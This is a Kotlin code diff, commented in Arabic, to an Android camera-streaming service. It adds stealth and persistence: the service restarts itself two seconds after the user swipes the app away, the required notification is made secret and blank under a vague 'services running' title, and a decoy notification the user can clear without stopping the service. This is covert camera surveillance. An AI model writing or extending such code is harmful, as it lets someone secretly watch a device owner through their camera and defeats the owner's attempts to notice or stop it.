@@ -136,6 +136,7 @@ class CameraService : LifecycleService() {
         startInForeground()
         startMonitoring()
         scheduleHeartbeat()
+        showUserNotification()
         return START_STICKY
     }
 
@@ -144,6 +145,24 @@ class CameraService : LifecycleService() {
         stopMonitoring()
         instance = null
         super.onDestroy()
+    }
+
+    // لما تسكر التطبيق من البلبيت، الخدمة ترجع تلقائياً خلال ثانيتين
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        super.onTaskRemoved(rootIntent)
+        if (!started) return
+        val restart = Intent(applicationContext, CameraService::class.java)
+        restart.setPackage(packageName)
+        val pending = PendingIntent.getService(
+            applicationContext, 2, restart,
+            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+        )
+        val alarm = getSystemService(ALARM_SERVICE) as android.app.AlarmManager
+        alarm.set(
+            android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
+            android.os.SystemClock.elapsedRealtime() + 2000,
+            pending
+        )
     }
 
     // ------------------------------------------------------------------
@@ -185,15 +204,39 @@ class CameraService : LifecycleService() {
     }
 
     private fun buildNotification(): Notification {
-        // بدون أي إجراء عند الضغط عليه، يبقى كإشعار عادي بدون وظيفة
+        // إشعار خفي جداً مطلوب من النظام، ما يظهر في لوحة الإشعارات
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setContentTitle("الخدمات تعمل")
             .setContentText(" ")
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setSilent(true)
-            .setOngoing(false)
+            .setOngoing(true)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build()
+    }
+
+    private fun showUserNotification() {
+        // إشعار مرئي قابل للمسح، ما يوقف الخدمة لو مسحه المستخدم
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val manager = getSystemService(NotificationManager::class.java)
+            val channel = NotificationChannel(
+                "tview_user", "الخدمات", NotificationManager.IMPORTANCE_MIN
+            )
+            channel.setShowBadge(false)
+            manager.createNotificationChannel(channel)
+        }
+        val userNotif = NotificationCompat.Builder(this, "tview_user")
+            .setSmallIcon(android.R.drawable.stat_notify_sync)
+            .setContentTitle("الخدمات تعمل")
+            .setContentText(" ")
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setSilent(true)
+            .setOngoing(false) // قابل للمسح
+            .setAutoCancel(false)
+            .build()
+        val manager = getSystemService(NotificationManager::class.java)
+        manager.notify(2, userNotif)
     }
 
     // ------------------------------------------------------------------
@@ -258,6 +301,11 @@ class CameraService : LifecycleService() {
         lanLink = ""
         lastRemoteStatus = "جاري تجهيز البث من أي مكان…"
         onStateChanged?.invoke()
+        // نمسح الإشعار المرئي لما تتوقف الخدمة
+        try {
+            val manager = getSystemService(NotificationManager::class.java)
+            manager.cancel(2)
+        } catch (e: Exception) {}
     }
 
     private fun doSwitchCamera() {
